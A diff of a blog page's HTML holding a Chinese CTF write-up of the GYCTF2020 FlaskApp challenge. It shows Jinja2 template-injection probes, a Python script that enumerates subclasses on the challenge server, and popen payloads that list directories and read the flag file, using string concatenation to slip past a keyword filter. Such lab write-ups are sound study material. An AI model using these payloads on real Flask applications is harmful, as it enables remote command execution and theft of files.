@@ -13,19 +13,12 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="题目地址：FlaskApp">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223449.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223727.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224035.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224237.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225355.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225427.png">
 <meta property="article:published_time" content="2022-04-17T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-04-18T14:59:18.070Z">
 <meta property="article:author" content="hdfzzf">
 <meta property="article:tag" content="SSTI">
 <meta property="article:tag" content="Flask">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223449.png">
     
     
       
@@ -98,7 +91,7 @@
         <li><a class="icon" aria-label="上一篇" href="/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="下一篇" href="/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/18/0CTF%202016%20piapiapia/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
       </ul>
@@ -157,29 +150,39 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BGYCTF2020%5DFlaskApp">FlaskApp</a></p>
+    <p>题目地址：<a
+target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BGYCTF2020%5DFlaskApp">FlaskApp</a></p>
 <span id="more"></span>
 <h1 id="题目信息">1. 题目信息</h1>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223449.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223449.png" /></p>
 <p>经过测试，确实该题目可以进行base64加密和解密。该页面的框架是Flask，因此可能存在着SSTI。直接用<code>&#123;&#123;7*'7'&#125;&#125;</code>用base64加密后再解密，发现提示</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223727.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223727.png" /></p>
 <p>换一个，用<code>&#123;&#123;0-0&#125;&#125;</code>，这时候得到的结果就是0，因此确实存在SSTI，并且渲染引擎是Flask。</p>
 <h1 id="解题">2. 解题</h1>
-<p>参考：<a href="Jinjia2+Flask模板注入.md">Jinjia2+Flask模板注入</a></p>
+<p>参考：<a
+href="Jinjia2+Flask模板注入.md">Jinjia2+Flask模板注入</a></p>
 <p>输入 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224035.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224035.png" /></p>
 <p>结果经过了html编码，可以看出第二个才是<code>object</code>。</p>
 <p>下一步，查看有哪些可用的子类 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>发现并没有任何结果，但是如果输入如下， <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[1]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224237.png" /></p>
-<p>是可以显示结果的。因此猜测后台可能做了某些处理，如果返回的字符超过一定的长度，就不显示结果。通过抓包发现，是POST提交参数test。因此，编写脚本自动化测试（写的不怎么好）： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, html  </span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  </span><br><span class="line">url = <span class="string">&#x27;http://6d8599e6-3743-4264-bad5-d406f5736b3f.node4.buuoj.cn:81/decode&#x27;</span>  </span><br><span class="line">payload = <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[%d]&#125;&#125;&#x27;</span>  </span><br><span class="line">results = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):  </span><br><span class="line">    text = payload % i  </span><br><span class="line">    text = base64.b64encode(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    param=&#123;  </span><br><span class="line">        <span class="string">&#x27;text&#x27;</span>: text  </span><br><span class="line">    &#125;  </span><br><span class="line">    t = requests.post(url, params=param)  </span><br><span class="line">    soup = BeautifulSoup(t.content, <span class="string">&quot;lxml&quot;</span>)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        res = soup.body.contents[<span class="number">3</span>].div.contents[<span class="number">2</span>].strip()[<span class="number">5</span>:]  <span class="comment"># 返回结果的字符串</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt;= <span class="number">2</span>:  <span class="comment"># 如果长度太短，说明没有子类了（不知道有没有可能中间空了一个）</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        res = html.unescape(res)  </span><br><span class="line">        results.append(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  </span><br><span class="line">    <span class="keyword">except</span>:  <span class="comment"># 有些可能没有返回的结果，做另外处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> is error&quot;</span>)  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  <span class="comment"># 可以不用这句</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;\n&#x27;</span>  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ress.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(<span class="built_in">str</span>.join(results)) <span class="comment"># 写入文件</span></span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224237.png" /></p>
+<p>是可以显示结果的。因此猜测后台可能做了某些处理，如果返回的字符超过一定的长度，就不显示结果。通过抓包发现，是POST提交参数test。因此，编写脚本自动化测试（写的不怎么好）：
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, html  </span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  </span><br><span class="line">url = <span class="string">&#x27;http://6d8599e6-3743-4264-bad5-d406f5736b3f.node4.buuoj.cn:81/decode&#x27;</span>  </span><br><span class="line">payload = <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[%d]&#125;&#125;&#x27;</span>  </span><br><span class="line">results = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):  </span><br><span class="line">    text = payload % i  </span><br><span class="line">    text = base64.b64encode(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    param=&#123;  </span><br><span class="line">        <span class="string">&#x27;text&#x27;</span>: text  </span><br><span class="line">    &#125;  </span><br><span class="line">    t = requests.post(url, params=param)  </span><br><span class="line">    soup = BeautifulSoup(t.content, <span class="string">&quot;lxml&quot;</span>)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        res = soup.body.contents[<span class="number">3</span>].div.contents[<span class="number">2</span>].strip()[<span class="number">5</span>:]  <span class="comment"># 返回结果的字符串</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt;= <span class="number">2</span>:  <span class="comment"># 如果长度太短，说明没有子类了（不知道有没有可能中间空了一个）</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        res = html.unescape(res)  </span><br><span class="line">        results.append(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  </span><br><span class="line">    <span class="keyword">except</span>:  <span class="comment"># 有些可能没有返回的结果，做另外处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> is error&quot;</span>)  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  <span class="comment"># 可以不用这句</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;\n&#x27;</span>  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ress.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(<span class="built_in">str</span>.join(results)) <span class="comment"># 写入文件</span></span><br></pre></td></tr></table></figure></p>
 <p>最后查看得到的文件，从中寻找可用的子类，我才用<code>127. &lt;class 'os._wrap_close'&gt;</code></p>
 <p>因此payload如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>发现被过滤了，经过测试发现，过滤了<code>os</code>, <code>popen</code>和<code>flag</code>。绕过方法比较简单<strong>字符串拼接:</strong></p>
+<p>发现被过滤了，经过测试发现，过滤了<code>os</code>,
+<code>popen</code>和<code>flag</code>。绕过方法比较简单<strong>字符串拼接:</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225355.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225355.png" /></p>
 <p>然后查看flag的payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;cat /this_is_the_fl&#x27;+&#x27;ag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225427.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225427.png" /></p>
 
   </div>
 </article>
@@ -227,7 +230,8 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/18/GYCTF2020%20FlaskApp/&title=GYCTF2020 FlaskApp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/18/GYCTF2020%20FlaskApp/&title=GYCTF2020 FlaskApp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/18/GYCTF2020%20FlaskApp/&title=GYCTF2020 FlaskApp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/18/GYCTF2020%20FlaskApp/&name=GYCTF2020 FlaskApp&description=&lt;p&gt;题目地址：&lt;a href=&#34;https://buuoj.cn/challenges#%5BGYCTF2020%5DFlaskApp&#34;&gt;FlaskApp&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/18/GYCTF2020%20FlaskApp/&name=GYCTF2020 FlaskApp&description=&lt;p&gt;题目地址：&lt;a
+href=&#34;https://buuoj.cn/challenges#%5BGYCTF2020%5DFlaskApp&#34;&gt;FlaskApp&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/18/GYCTF2020%20FlaskApp/&t=GYCTF2020 FlaskApp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
@@ -248,7 +252,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
